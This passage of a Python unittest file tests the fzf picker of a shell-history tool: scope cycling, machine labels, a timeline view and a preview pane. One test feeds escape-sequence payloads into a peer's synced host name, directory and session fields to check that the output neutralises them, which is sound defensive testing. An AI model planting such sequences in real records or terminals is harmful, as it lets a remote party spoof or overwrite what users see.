            search._cycle_binding("woswoar", "", " --host-width 0"),
            "transform:",
            "woswoar (global) ",
        )
        self.assertIn(f"change-prompt({search._prompt_for('host')})", out)

    def test_the_reload_keeps_the_colour_and_the_width(self) -> None:
        """A cycle that dropped either would change the layout mid-picker, and
        `command_from_line` slices at a width decided when it opened."""
        self.assertIn(
            "--colour --host-width 7",
            search._cycle_binding("woswoar", "", " --host-width 7"),
        )

    def test_an_older_fzf_is_offered_nothing_it_cannot_do(self) -> None:
        """An unknown action in a `--bind` makes fzf refuse to start, so this
        cannot be offered optimistically: the cost of guessing wrong is no
        picker at all."""
        with mock.patch.object(search, "fzf_supports_transform", return_value=False):
            argv = search._fzf_argv("global", "", True, 0)
        self.assertFalse([a for a in argv if "ctrl-r:" in a])
        self.assertNotIn("ctrl-r", " ".join(argv), "a key that does nothing here is named anyway")

    def test_a_new_enough_fzf_gets_it(self) -> None:
        with mock.patch.object(search, "fzf_supports_transform", return_value=True):
            argv = search._fzf_argv("global", "", True, 0)
        self.assertTrue([a for a in argv if a.startswith("--bind=ctrl-r:transform:")])
        header = next(a for a in argv if a.startswith("--header="))
        self.assertIn("ctrl-r", header, "the key is bound but never mentioned")

    def test_the_version_is_reported_as_well_as_judged(self) -> None:
        """`doctor` shows a person the string fzf printed while the gate below
        compares numbers, so both come from one call -- deriving either from the
        other at each call site is how the two would come to disagree."""
        cases = [
            ("0.73.1 (Fedora)", ("0.73.1 (Fedora)", (0, 73))),
            ("0.44.1 (debian)", ("0.44.1 (debian)", (0, 44))),
            ("nonsense", ("nonsense", None)),
            ("", ("", None)),
        ]
        for printed, wanted in cases:
            with self.subTest(version=printed):
                done = subprocess.CompletedProcess([], 0, stdout=printed, stderr="")
                with mock.patch("subprocess.run", return_value=done):
                    self.assertEqual(search.fzf_version(), wanted)

    def test_an_fzf_that_cannot_be_run_is_not_an_exception(self) -> None:
        """It is a machine without fzf, which `doctor` reports and the picker
        has to survive rather than crash on."""
        with mock.patch("subprocess.run", side_effect=OSError("no such file")):
            self.assertEqual(search.fzf_version(), ("", None))
            self.assertFalse(search.fzf_supports_transform())

    def test_the_version_gate_reads_a_version(self) -> None:
        for version, wanted in (("0.44.1 (Fedora)", False), ("0.45.0", True), ("0.73.1", True)):
            with self.subTest(version=version):
                done = subprocess.CompletedProcess([], 0, stdout=version, stderr="")
                with mock.patch("subprocess.run", return_value=done):
                    self.assertEqual(search.fzf_supports_transform(), wanted)

    def test_an_fzf_that_says_nothing_useful_is_treated_as_old(self) -> None:
        """Erring towards the picker still opening."""
        done = subprocess.CompletedProcess([], 0, stdout="", stderr="")
        with mock.patch("subprocess.run", return_value=done):
            self.assertFalse(search.fzf_supports_transform())


class TestLabelsStayDifferent(WoswoarTestCase):
    """Reported: two machines showing as `martinleitnerank` and
    `martinus@DT-24YY`, both cut at sixteen, neither saying which machine.

    A name is `user@host`, and on one person's machines the user is usually the
    same while the host is what differs -- and it is the host that a long
    username pushes off the end.
    """

    A, B = "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb"

    def named(self, **names: str) -> dict[str, str]:
        for host, name in names.items():
            store.write_atomic(store.name_file(getattr(self, host)), f"{name}\n".encode())
        return search.host_labels({self.A, self.B})

    def test_the_reported_case(self) -> None:
        labels = self.named(A="martinleitnerankerl@thinkpad", B="martinus@DT-24YYQ3")
        self.assertEqual(labels[self.A], "thinkpad")
        self.assertEqual(labels[self.B], "DT-24YYQ3")

    def test_the_full_name_comes_back_when_hosts_would_collide(self) -> None:
        """Two accounts on one machine, or the same hostname twice: the host
        half no longer distinguishes, so it is not used."""
        labels = self.named(A="martin@box", B="root@box")
        self.assertEqual({labels[self.A], labels[self.B]}, {"martin@box", "root@box"})

    def test_something_too_long_keeps_its_end(self) -> None:
        labels = self.named(A="x@" + "a" * 40, B="y@short")
        self.assertTrue(labels[self.A].startswith("…"), labels[self.A])
        self.assertEqual(len(labels[self.A]), search._HOST_WIDTH)

    def test_the_column_is_only_as_wide_as_the_labels(self) -> None:
        self.named(A="martinleitnerankerl@thinkpad", B="martinus@DT-24YYQ3")
        self.assertEqual(search.host_width_for({self.A, self.B}), len("DT-24YYQ3"))


class TestSayingHowToFilterByMachine(WoswoarTestCase):
    """`^box` matches only the machine called box.

    It works because `--nth=2..` starts the searched region at the machine name
    and fzf anchors `^` to the start of that region, not of the line -- so this
    needed no new key, no new mode, and no change to the line. It needed saying.

    Reported as "I have a host named box and that is short enough to also be
    part of a few commands", which is exactly what an unanchored query cannot
    tell apart.
    """

    def test_the_hint_appears_once_there_is_a_column_to_filter_on(self) -> None:
        header = search._header(host_width=8)
        self.assertIn("^name", header)

    def test_a_single_machine_is_not_told_about_it(self) -> None:
        """There is no machine column on a one-machine install, so the hint
        would describe something that is not on screen."""
        self.assertNotIn("^name", search._header(host_width=0))

    def test_every_scope_is_named_and_every_key_reachable(self) -> None:
        """The first three direct keys share one segment where Ctrl-R names the
        scopes, because `g`, `h` and `s` are the initials of the words beside
        them -- but all four still have to be *findable*, and so does each
        scope, or the compaction has quietly dropped one.

        Driven off `search.SCOPES` rather than a list written here, because a
        scope added there and forgotten in the header is exactly the failure
        this is for: the list used to be hardcoded, and it had already fallen
        one behind by the time `dir` arrived."""
        for supported in (True, False):
            for width in (0, 8):
                with (
                    self.subTest(transform=supported, host_width=width),
                    mock.patch.object(search, "fzf_supports_transform", return_value=supported),
                ):
                    header = search._header(host_width=width)
                    for scope in search.SCOPES:
                        self.assertIn(scope, header, f"{scope} is not named")
                        key = SCOPE_KEYS[scope].removeprefix("ctrl-")
                        self.assertRegex(header, rf"ctrl-(\w+/)*{key}\b|ctrl-{key}\b")

    def test_the_cycle_says_which_order_it_goes_in(self) -> None:
        """`ctrl-r cycles` said that it cycled and not through what, so the
        only way to learn the order was to press it three times."""
        with mock.patch.object(search, "fzf_supports_transform", return_value=True):
            header = search._header(host_width=0)
        self.assertIn(" \u2192 ".join(search.SCOPES), header)

    def test_the_timeline_comes_after_the_scopes(self) -> None:
        """Ordered by how far each takes you from an ordinary search: change
        what is listed, then change the kind of list, then narrow it."""
        with mock.patch.object(search, "fzf_supports_transform", return_value=True):
            header = search._header(host_width=8)
        self.assertLess(header.index("ctrl-r"), header.index("ctrl-t"))
        self.assertLess(header.index("ctrl-t"), header.index("^name"))

    def test_ctrl_r_is_listed_only_where_it_works(self) -> None:
        """`transform` needs fzf 0.45+, and a header naming a key that does
        nothing is worse than one that stays quiet about it."""
        for supported in (True, False):
            with (
                self.subTest(transform=supported),
                mock.patch.object(search, "fzf_supports_transform", return_value=supported),
            ):
                self.assertEqual("ctrl-r" in search._header(8), supported)

    def test_the_header_reaches_fzf(self) -> None:
        """A header nothing passes on is a string in a unit test."""
        argv = search._fzf_argv("global", "", dedup=True, host_width=8)
        self.assertIn(f"--header={search._header(8)}", argv)

    ROWS: ClassVar[list[str]] = [
        "     2m  box       docker run sandbox",
        "  3h12m  thinkpad  docker ps",
        "   6d4h  box       ls",
        "   1d2h  at1i-ws07 echo box",
    ]

    def fzf_filter(self, query: str) -> str:
        """Run the real fzf with the matching flags the picker actually passes.

        `--nth` is taken out of `_fzf_argv` rather than written again here. The
        claim under test is about how fzf resolves `^` against *that* field
        range, so a test spelling its own range has quietly stopped testing the
        code: with the value hardcoded, changing it to `--nth=1..` -- which
        anchors `^` to the age column and breaks the feature outright -- left
        every assertion below passing.
        """
        argv = search._fzf_argv("global", "", dedup=True, host_width=8)
        matching = [arg for arg in argv if arg.startswith("--nth=") or arg == "--ansi"]
        self.assertTrue(matching, "no matching flags found; _fzf_argv changed shape")
        return subprocess.run(
            ["fzf", "--filter", query, *matching],
            input="\n".join(self.ROWS),
            text=True,
            capture_output=True,
            check=False,
        ).stdout

    @unittest.skipUnless(shutil.which("fzf"), "fzf required")
    def test_the_anchor_really_does_restrict_to_the_machine(self) -> None:
        """Driven through the real fzf, because the whole claim is about how fzf
        resolves `^` against a field range -- which no assertion about our own
        strings can check."""
        got = self.fzf_filter("^box")
        chosen = sorted(line.split()[1] for line in got.splitlines() if line.strip())
        self.assertEqual(chosen, ["box", "box"], "the anchor did not restrict to the machine")

    @unittest.skipUnless(shutil.which("fzf"), "fzf required")
    def test_it_composes_with_an_ordinary_search(self) -> None:
        """Filtering to a machine is worth little if it cannot then be searched,
        and that is two terms in one query rather than a mode to leave."""
        got = self.fzf_filter("^box docker")
        self.assertIn("docker run sandbox", got)
        self.assertNotIn("docker ps", got, "another machine survived the anchor")
        self.assertNotIn("  ls", got, "the second term was ignored")


class TestTheTimelineAroundACommand(WoswoarTestCase):
    """Find a command, then read what happened either side of it.

    Asked for as: "use fzf search to find a particular command, then press
    ctrl-t to switch to timeline mode, the commands above and below unfold and
    I can scroll up and down and choose the surrounding ones."

    So it is one fzf session throughout -- `reload` swaps the list underneath a
    picker that never closes, and `pos` puts the cursor back on the command that
    was found, without which the surrounding commands unfold forty rows away
    from where you are looking.
    """

    SESSION_CMDS: ClassVar[list[str]] = [
        "cd ~/proj",
        "cargo build",
        "cargo test",
        "vim src/lib.rs",
        "cargo test",
        "git add -A",
        "git commit -m wip",
    ]

    def setUp(self) -> None:
        super().setUp()
        with store.private_append(store.log_file(MACHINE_ID, "2026-07-29")) as handle:
            for i, cmd in enumerate(self.SESSION_CMDS):
                entry = Entry(NOW + i * 60, MACHINE_ID, "s1", "~", 0, 1, cmd)
                handle.write(format_line(entry) + "\n")

    def ranked(self) -> list[str]:
        return search.lines_for("global")

    def row_of(self, needle: str) -> int:
        return next(i for i, line in enumerate(self.ranked()) if needle in line)

    def timeline(self, needle: str) -> list[str]:
        return [
            search.command_from_line(line)
            for line in search.lines_for("global", around=self.row_of(needle))
        ]

    def test_it_shows_what_came_before_and_after(self) -> None:
        """Both directions, which is the whole feature: the list you arrived
        from could only ever show you the command itself."""
        found = self.timeline("vim")
        at = found.index("vim src/lib.rs")
        self.assertEqual(found[at + 1 :], ["cargo test", "cargo build", "cd ~/proj"])
        self.assertEqual(found[:at], ["git commit -m wip", "git add -A", "cargo test"])

    def test_it_reads_newest_first_like_every_other_list(self) -> None:
        """This started out reversed, on the theory that a timeline should read
        downwards into the future. Wrong in use: every other screen here puts
        the recent thing at the top, and one screen that does not is a screen
        you have to stop and reorient on."""
        self.assertEqual(self.timeline("vim"), self.SESSION_CMDS[::-1])

    def test_repeats_are_not_collapsed(self) -> None:
        """A timeline with the repeats removed is not a timeline. Running
        `cargo test` twice while fixing something is the shape of what
        happened, and the deduped list this was reached from shows it once."""
        self.assertEqual(self.timeline("vim").count("cargo test"), 2)
        listed = [search.command_from_line(line) for line in self.ranked()]
        self.assertEqual(listed.count("cargo test"), 1)

    def test_the_cursor_lands_on_the_command_that_was_found(self) -> None:
        """`pos` is 1-based. Without it fzf resets to the top of the window and
        the command you searched for is forty rows below the cursor.

        Checked at the ends as well as the middle, and that is not padding: the
        first version only asked about a command in the *centre* of the window,
        where the position before reversing and the position after it are the
        same number. A mutation that dropped the reversal from the arithmetic
        went unnoticed until an off-centre anchor was asked about.
        """
        for needle in ("cd ~/proj", "vim src/lib.rs", "git commit -m wip"):
            with self.subTest(command=needle):
                row = self.row_of(needle)
                at = search.anchor_position(row, "global")
                found = search.lines_for("global", around=row)
                self.assertEqual(search.command_from_line(found[at - 1]), needle)

    def test_the_anchor_sits_mid_window_once_there_is_history_either_side(self) -> None:
        """With fewer commands than the span there is nothing above, and the
        cursor is near the top -- which is correct, and is also why the position
        cannot be a constant fzf could be told once."""
        long_day = [f"cmd {i}" for i in range(search.TIMELINE_SPAN * 3)]
        with store.private_append(store.log_file(MACHINE_ID, "2026-07-30")) as handle:
            for i, cmd in enumerate(long_day):
                entry = Entry(NOW + 10_000 + i * 60, MACHINE_ID, "s1", "~", 0, 1, cmd)
                handle.write(format_line(entry) + "\n")
        middle = self.row_of(f"cmd {search.TIMELINE_SPAN + 5}")
        self.assertEqual(search.anchor_position(middle, "global"), search.TIMELINE_SPAN + 1)

    def test_an_index_past_the_end_of_the_list_gives_nothing(self) -> None:
        """The index comes from fzf and a background sync can merge commands
        between the picker opening and the key being pressed. Showing the wrong
        moment in history confidently is worse than showing none."""
        self.assertEqual(search.lines_for("global", around=9999), [])
        self.assertEqual(search.anchor_position(9999, "global"), 0)

    def test_an_anchor_that_is_not_in_the_history_gives_nothing(self) -> None:
        """The other way the anchor can be lost, and the one an out-of-range
        index does not reach: a row that is *in* the ranked list but not in the
        rows the timeline is built from.

        Reached by making `rank_rows` return something the data does not
        contain, because by construction today it cannot -- both come from the
        same columns. That is exactly why this needs a test rather than a
        comment: the branch is unreachable until the day the two stop agreeing,
        and then it is the difference between an empty timeline and a
        confidently wrong one.
        """
        invented = (NOW + 999_999, "never ran this", "0", MACHINE_ID)
        with mock.patch.object(search, "rank_rows", return_value=[invented]):
            self.assertEqual(search.lines_for("global", around=0), [])
            self.assertEqual(search.anchor_position(0, "global"), 0)

    def test_the_scope_is_kept(self) -> None:
        """A timeline of another machine's evening is not what ctrl-t on a
        host-scoped list means."""
        with store.private_append(store.log_file("ffffffffffffffff", "2026-07-29")) as handle:
            entry = Entry(NOW + 200, "ffffffffffffffff", "elsewhere", "~", 0, 1, "not mine")
            handle.write(format_line(entry) + "\n")
        row = next(i for i, line in enumerate(search.lines_for("host")) if "vim" in line)
        found = search.lines_for("host", around=row)
        self.assertNotIn("not mine", " ".join(found))

    def test_the_picker_binds_it_and_says_so(self) -> None:
        # `transform` is fzf 0.45+, and the binding is not offered without it.
        # Forced rather than skipped: the runner's fzf decides whether this test
        # runs at all otherwise, which is how a green pull request failed while
        # cutting a release once already.
        with mock.patch.object(search, "fzf_supports_transform", return_value=True):
            argv = search._fzf_argv("global", "", dedup=True, host_width=0)
        binds = " ".join(a for a in argv if a.startswith("--bind="))
        self.assertIn("ctrl-t:", binds)
        # `reload-sync`, not `reload`: the asynchronous one lets `pos` run
        # against the list still on screen, which put the cursor anywhere but
        # on what was found. `clear-query` so that typing next filters the
        # timeline rather than re-applying the search that got you here.
        for piece in ("--around $i", "--print-anchor", "+pos($p)", "reload-sync(", "clear-query"):
            self.assertIn(piece, binds, f"the ctrl-t binding is missing {piece}")
        header = next(a for a in argv if a.startswith("--header="))
        self.assertIn("ctrl-t timeline", header, "the key is bound but never mentioned")

    def test_the_key_is_not_advertised_on_an_fzf_that_cannot_do_it(self) -> None:
        with mock.patch.object(search, "fzf_supports_transform", return_value=False):
            argv = search._fzf_argv("global", "", dedup=True, host_width=0)
        binds = " ".join(a for a in argv if a.startswith("--bind="))
        self.assertNotIn("ctrl-t:", binds)
        header = next(a for a in argv if a.startswith("--header="))
        self.assertNotIn("ctrl-t", header, "a key that does nothing here is named anyway")

    def test_it_carries_every_scope_through(self) -> None:
        """Ctrl-T reads the scope back out of the prompt, exactly as the cycle
        does, so a scope with no arm of its own silently becomes `global` -- a
        timeline of the wrong list, with no error and a prompt that says
        `timeline dir` while showing everything.

        Driven as the real `sh`, because what is under test is that snippet's
        decision. `--print-anchor` is stubbed out of the way: this is about the
        scope it chooses, and the anchor needs a history to look at."""
        binding = search._timeline_binding("true", "", " --host-width 0")
        for scope in search.SCOPES:
            with self.subTest(scope=scope):
                out = run_binding(binding, "transform:", f"woswoar ({scope}) ")
                self.assertIn(f"change-prompt(woswoar (timeline {scope}) )", out)
                self.assertIn(f"--scope {scope} --around", out)

    def test_it_emits_nothing_when_no_row_is_highlighted(self) -> None:
        """`{n}` is empty when there is no current item, and the line it used to
        compose was `woswoar list ... --around` with the value missing.

        fzf runs the transform anyway rather than declining to -- it has no way
        to know the placeholder mattered -- so the reload ran, argparse refused
        the flag, and `[Command failed: /home/…/woswoar list --colour
        --host-width 10 --scope global --around ]` appeared in the list where
        the history should be. Reported from a real picker by pressing Ctrl-R
        and then Ctrl-T fast enough that the first key's reload had not landed.

        Emitting no action at all is the remedy, and the second half of this
        test is what keeps that from being satisfied by a binding that emits
        nothing ever.
        """
        binding = search._timeline_binding("true", "", " --host-width 0")

        nothing = run_binding(as_fzf_would(binding, ""), "transform:", "woswoar (global) ")
        self.assertEqual(nothing, "", "an empty index still produced actions")

        picked = run_binding(as_fzf_would(binding, "4"), "transform:", "woswoar (global) ")
        # The whole reload, not `--around 4` anywhere in the output: the preview
        # this key repoints carries the same flag, so the looser assertion holds
        # just as well when the *list* was left unanchored -- which is a timeline
        # of the wrong rows under a pane describing the right ones.
        self.assertIn(
            "reload-sync(true list --colour --host-width 0 --scope global --around 4)",
            picked,
            "the anchor never reached the list the key reloads",
        )

    def test_the_prompt_it_paints_is_one_it_can_read_back(self) -> None:
        """The round trip, which the test above only ever walks one way.

        It feeds `woswoar ({scope}) ` in and asserts `woswoar (timeline {scope}) `
        comes out -- and nothing then fed *that* back. So when the scope arms
        were anchored to `woswoar (<scope>`, the timeline's own prompt stopped
        matching any of them and every key pressed inside a timeline fell to
        `global`: Ctrl-T recentred against a list nobody asked for, which is the
        failure this binding carries the scope in its prompt to prevent.

        Both keys, because both read it: the timeline stays where it is, and the
        cycle moves on from the scope the timeline is showing.
        """
        timeline = search._timeline_binding("true", "", " --host-width 0")
        cycle = search._cycle_binding("woswoar", "", " --host-width 0")
        for scope in search.SCOPES:
            with self.subTest(scope=scope):
                painted = f"woswoar (timeline {scope}) "
                self.assertIn(
                    f"--scope {scope} --around", run_binding(timeline, "transform:", painted)
                )
                out = run_binding(cycle, "transform:", painted)
                self.assertIn(f"--scope {search._NEXT[scope]})", out)


class TestThePreviewBlock(WoswoarTestCase):
    """`list --show N`: the three recorded fields nobody could read back.

    `cwd`, `duration_ms` and `session` are recorded, encrypted, synced and
    cached, and there is no width on the display line for any of them -- it is a
    fixed-width prefix that `command_from_line` slices rather than parses. The
    pane costs no width because it describes one row.
    """

    #: Sorts *before* `MACHINE_ID`, which is what makes the alignment test below
    #: able to fail: the columns are built by walking the log files, so a peer
    #: whose id sorts second would occupy the same indices either way.
    PEER = "0000000000000001"

    def setUp(self) -> None:
        super().setUp()
        self.ts = NOW

    def record(
        self,
        cmd: str,
        cwd: str = "~/src/woswoar",
        code: int = 0,
        ms: int = 1234,
        session: str = "6a79f245-36ea53",
        host: str = MACHINE_ID,
    ) -> None:
        self.ts += 1
        with store.private_append(store.log_file(host, "2026-07-29")) as handle:
            handle.write(format_line(Entry(self.ts, host, session, cwd, code, ms, cmd)) + "\n")

    def listed(self, *argv: str) -> list[str]:
        return run_cli("list", *argv).out.splitlines()

    def shown(self, index: int, *argv: str) -> str:
        return run_cli("list", "--show", str(index), *argv).out

    def fields(self, block: str) -> dict[str, str]:
        """The pane's labelled table as a mapping, command excluded.

        By name rather than by line number, which is what these tests used to do
        -- and a line number says nothing about which field it meant, so adding
        a row silently moved four assertions onto their neighbours.
        """
        table, _, _ = unstyled(block).partition("\n\n")
        return {
            label: rest.strip()
            for label, _, rest in (line.partition("  ") for line in table.splitlines())
        }

    def test_show_reports_the_row_the_list_shows(self) -> None:
        """Every index, and every field of it.

        The two sides rank from the same columns, so this holds by construction
        -- right up until a column is reordered for the preview's sake, which
        moves nothing on a display line and is therefore invisible from the
        picker. Each row's directory, session, status and duration are derived
        from its position here, so a pair of columns swapped in either direction
        shows up as the wrong value rather than as a shorter list.
        """
        commands = ["one", "two", "three", "four", "five"]
        for i, cmd in enumerate(commands):
            self.record(cmd, cwd=f"~/d{i}", code=i, ms=i + 1, session=f"sess{i}")

        lines = self.listed("--scope", "global")
        self.assertEqual(len(lines), len(commands))
        for index, line in enumerate(lines):
            with self.subTest(index=index):
                cmd = search.command_from_line(line)
                i = commands.index(cmd)
                block = self.shown(index, "--scope", "global")
                shows = self.fields(block)
                self.assertEqual(block.splitlines()[-1], cmd)
                self.assertEqual(shows["session"], f"sess{i}")
                self.assertEqual(shows["dir"], f"~/d{i}")
                self.assertEqual(shows["exit"], str(i))
                self.assertEqual(shows["took"], f"{i + 1} ms")

    def test_show_under_a_timeline_uses_the_window(self) -> None:
        """After Ctrl-T the list fzf holds is the timeline *window*, so `{n}`
        indexes that -- and the same number resolved against the ranked list is
        a different command, silently. Repeats are what makes the two disagree:
        the ranked list collapses them and the timeline must not."""
        for i, cmd in enumerate(["first", "dup", "second", "dup", "third"]):
            self.record(cmd, cwd=f"~/d{i}")
        anchor = next(
            i for i, line in enumerate(self.listed("--scope", "global")) if "second" in line
        )

        window = self.listed("--scope", "global", "--around", str(anchor))
        for index, line in enumerate(window):
            with self.subTest(index=index):
                block = self.shown(index, "--scope", "global", "--around", str(anchor))
                self.assertEqual(block.splitlines()[-1], search.command_from_line(line))

        # Without this the fixture would pass just as happily with `--around`
        # dropped from `--show`: it says the two lists really do answer
        # differently at the index the loop above checked.
        with_window = self.shown(3, "--scope", "global", "--around", str(anchor))
        self.assertNotEqual(with_window, self.shown(3, "--scope", "global"))
        self.assertEqual(self.fields(with_window)["dir"], "~/d1")

    def test_a_cursor_past_the_end_gets_a_blank_pane_not_a_traceback(self) -> None:
        """The index comes from fzf and a background sync can merge commands
        between the picker opening and the cursor moving."""
        self.record("only one")
        self.assertEqual(self.shown(9999, "--scope", "global"), "")
        self.assertEqual(self.shown(0, "--scope", "session"), "", "no hook, no session")

    def test_the_extra_fields_belong_to_the_row_they_are_shown_with(self) -> None:
        """The `host` scope drops whole files before a row is looked at, so the
        four display columns can be shorter than the history. Fetching the other
        three separately -- `Cache.cwds()` walks every file -- lines them up only
        by luck, and the pane would then put a peer's directory under this
        machine's command with nothing on screen to say so.

        `zip(strict=True)` turns that particular slip into an exception rather
        than a wrong answer, which is the point of it being there; this asserts
        the answer that exception is protecting.
        """
        self.record("theirs", cwd="~/their-dir", host=self.PEER)
        self.record("mine", cwd="~/my-dir")
        block = self.shown(0, "--scope", "host")
        self.assertEqual(block.splitlines()[-1], "mine")
        self.assertIn("~/my-dir", block)
        self.assertNotIn("their-dir", block)

    def test_a_peers_record_cannot_drive_the_terminal(self) -> None:
        """Every field in the block came off another machine, and the pane is a
        new place for each of them to reach a terminal. `cwd` and `session` had
        never been printed anywhere before this; `session` was not made inert at
        the cache door until it was.
        """
        store.write_atomic(store.name_file(self.PEER), b"peer\x1b[1A\x1b[2K\n")
        self.record(
            "echo hi\x07",
            cwd="~/\x1b[2K\x1b[1Aspoofed",
            session="s1\x1b[2Kfaked",
            host=self.PEER,
        )
        block = self.shown(0, "--scope", "global")
        self.assertIn("spoofed", block, "the directory must still be shown")
        self.assertIn("faked", block, "the session must still be shown")
        self.assertEqual([c for c in block if c < " " and c != "\n"], [])

    def test_what_was_never_recorded_says_so_rather_than_reading_as_zero(self) -> None:
        """An imported history has no directory, no exit code and no duration,
        and that is most of a fresh install. `exit -1` would invent a failure --
        the same misreading that once painted every imported command red."""
        self.record("ls -la", cwd="", code=-1, ms=-1, session="import")
        shows = self.fields(self.shown(0, "--scope", "global"))
        self.assertEqual(shows["dir"], "not recorded")
        self.assertEqual(shows["exit"], "not recorded")
        self.assertEqual(shows["took"], "not recorded")

    def test_every_field_is_named_and_none_is_ever_missing(self) -> None:
        """Reported as "hard to read, and there is no information what each line
        means": five values run together on four lines need a reader who already
        knows the record format, and the whole point of the pane is that nobody
        does -- three of these fields have never been on a screen.

        Named *and* always present. An imported row has no directory, no exit
        code, no duration and no session, and the first version of this simply
        left those lines out; a table with holes in it reads as a broken pane
        rather than as a fact about the row, and there is nothing left to line
        the remaining values up against.
        """
        self.record("ls -la", cwd="", code=-1, ms=-1, session="")
        block = self.shown(0, "--scope", "global")
        self.assertEqual(
            list(self.fields(block)),
            ["when", "dir", "host", "session", "exit", "took"],
        )
        self.assertEqual(self.fields(block)["session"], "not recorded")
        # Last, and outside the table: it is the one field with no bound on its
        # length, and the pane has a fixed number of rows.
        self.assertEqual(block.splitlines()[-1], "ls -la")

    def test_colour_is_asked_for_and_never_reaches_a_pipe(self) -> None:
        """`--show` is a command line like any other, so `woswoar list --show 0`
        has no more business emitting escapes unasked than `woswoar list` does.
        The pane passes `--colour` and that is the only reason they are there."""
        self.record("true")
        plain = self.shown(0, "--scope", "global")
        painted = self.shown(0, "--scope", "global", "--colour")
        self.assertNotIn("\x1b", plain)
        self.assertEqual(unstyled(painted), plain, "colour changed more than the colour")
        # The label column is what the eye skips: it is the same six words on
        # every row, where the value is the answer.
        self.assertIn(f"{search._DIM}when", painted)
        self.assertIn(f"{search._BOLD}true{search._RESET}", painted)

    def test_the_exit_code_is_painted_green_red_or_not_at_all(self) -> None:
        """Three answers, which is why `is_failure` cannot serve here: it has
        two, and its unknown-is-not-failure rule is exactly what stops an
        imported history reading as a screenful of failures. The pane still has
        to distinguish "exited cleanly" from "nobody ever knew"."""
        for cmd, code in (("boom", 127), ("fine", 0), ("imported", -1)):
            self.record(cmd, code=code)
        boom, fine, imported = (self.shown(i, "--scope", "global", "--colour") for i in (2, 1, 0))
        self.assertIn(f"{search._FAILED}127{search._RESET}", boom)
        self.assertIn(f"{search._OK}0{search._RESET}", fine)
        self.assertIn(f"{search._DIM}not recorded{search._RESET}", imported)
        self.assertNotIn(search._FAILED, imported, "an unrecorded exit code was painted a failure")

    def test_a_duration_is_readable_at_every_scale(self) -> None:
        for ms, expected in [
            ("0", "0 ms"),
            ("87", "87 ms"),
            ("999", "999 ms"),
            ("1000", "1.0 s"),
            ("1234", "1.2 s"),
            ("59999", "60.0 s"),
            ("60000", "1m 0s"),
            ("3599000", "59m 59s"),
            ("3725000", "1h 2m"),
        ]:
            with self.subTest(ms=ms):
                self.assertEqual(search._duration_label(ms), expected)

    def test_a_duration_that_was_never_measured_is_left_out(self) -> None:
        """None, not "0 ms": a whole column of zeroes is a claim, and an absent
        line is the truth. `nonsense` stands for a damaged field, which should
        cost this line and not the block."""
        self.assertIsNone(search._duration_label("-1"))
        self.assertIsNone(search._duration_label("nonsense"))


class TestThePreviewBinding(unittest.TestCase):
    """The `sh` the preview runs, and the actions that repoint it.

    Driven as the real shell for the same reason `TestCtrlRCyclesTheScope` is:
    the decision this snippet makes is the part that can be wrong, and it needs
    no terminal to make it.
    """

    def preview(self, prompt: str | None, self_cmd: str = "echo RAN") -> str:
        return run_binding(search._preview_binding(self_cmd, ""), "--preview=", prompt)

    def test_the_preview_fails_closed_without_a_prompt(self) -> None:
        """Guessing `global` is fine for a key that *reloads* -- you get a list
        whose prompt says what it is. Here the same guess is unfalsifiable: a
        block describing the wrong row looks exactly like one describing the
        right row. `FZF_PROMPT` is read on the assumption fzf exports it, and no
        version is known to have introduced it."""
        for prompt in (None, "", "$ "):
            with self.subTest(prompt=prompt):
                out = self.preview(prompt)
                self.assertEqual(out.strip(), search.PREVIEW_UNKNOWN)
                self.assertNotIn("RAN", out, "it fell through and described some other list")

    def test_it_asks_about_the_list_that_is_on_screen(self) -> None:
        for scope in search.SCOPES:
            with self.subTest(scope=scope):
                out = self.preview(f"woswoar ({scope}) ")
                self.assertEqual(out.strip(), f"RAN list --colour --show {{n}} --scope {scope}")

    def argv(self) -> list[str]:
        with mock.patch.object(search, "fzf_supports_transform", return_value=True):
            return search._fzf_argv("global", "", dedup=True, host_width=0)

    def test_the_preview_is_hidden_until_toggled(self) -> None:
        """It forks an interpreter and reads the whole cache per cursor move.
        Visible by default, that is felt as lag under a held arrow key; hidden,
        a user who never presses the key pays nothing at all."""
        argv = self.argv()
        window = next(a for a in argv if a.startswith("--preview-window="))
        self.assertIn("hidden", window)
        self.assertIn(f"--bind={search.PREVIEW_KEY}:toggle-preview", argv)
        self.assertIn(
            f"{search.PREVIEW_KEY} details",
            next(a for a in argv if a.startswith("--header=")),
        )

    def test_nothing_is_offered_to_an_fzf_that_may_not_have_the_pieces(self) -> None:
        """An unknown key name in a `--bind` makes fzf refuse to start, so the
        cost of guessing wrong about `ctrl-/` is the picker, not the key."""
        with mock.patch.object(search, "fzf_supports_transform", return_value=False):
            argv = search._fzf_argv("global", "", dedup=True, host_width=0)
        self.assertNotIn("--preview", " ".join(argv))
        self.assertNotIn(search.PREVIEW_KEY, " ".join(argv))

    def test_every_key_that_changes_the_list_repoints_the_pane(self) -> None:
        """A preview left pointing at the list it was set up for is the whole
        hazard of this feature. Ctrl-T pins it to one `--around` window, and
        every key that can be pressed *next* has to take it back off again --
        including the two that reach it through a `transform`, where the `{n}`
        meant for the pane has to survive fzf expanding the transform's own
        command line."""
        binds = [a for a in self.argv() if a.startswith("--bind=")]
        for key in [f"ctrl-{search.KEYS[scope]}" for scope in search.SCOPES] + ["ctrl-r", "ctrl-t"]:
            with self.subTest(key=key):
                bind = next(a for a in binds if a.startswith(f"--bind={key}:"))
                self.assertIn("change-preview(", bind)
                self.assertIn("--show", bind)
        timeline = next(a for a in binds if a.startswith("--bind=ctrl-t:"))
        # `\{n}` for the row and `$i` for the window, and the difference is the
        # point: the first is a template fzf re-expands on every cursor move,
        # the second is the anchor this keypress chose, frozen into the action.
        # `$i` and not `{n}` because an index fzf substitutes with nothing when
        # no row is current took `--around`'s value with it.
        self.assertIn("--show \\{n} --scope $s --around $i", timeline)
        cycle = next(a for a in binds if a.startswith("--bind=ctrl-r:"))
        self.assertIn("--show \\{n} --scope $n", cycle)
        self.assertNotIn("--around", cycle, "the way out of a timeline must not stay in it")


@requires_fzf
class TestTheDirectoryPromptUnderARealFzf(WoswoarTestCase):
    """The label on screen, and still the right scope after it.

    Every other test of this asserts the strings woswoar hands fzf. The two
    things only a real one can answer are whether it paints a prompt with a path
    in it, and whether the `case` that reads that prompt back still lands on
    `dir` -- which is the failure the old substring matcher had, and it was
    silent: the list stayed right while the *next* keypress went somewhere else.
    """

    def setUp(self) -> None:
        super().setUp()
        # `session-manager`, not `proj`, and that is the whole fixture: a path
        # with no scope name in it answers `global` under the old substring arms
        # too, so this test passed against them -- verified by running it with
        # the old `_scope_case` restored. The name is what makes step three
        # distinguish anchored arms from substring ones.
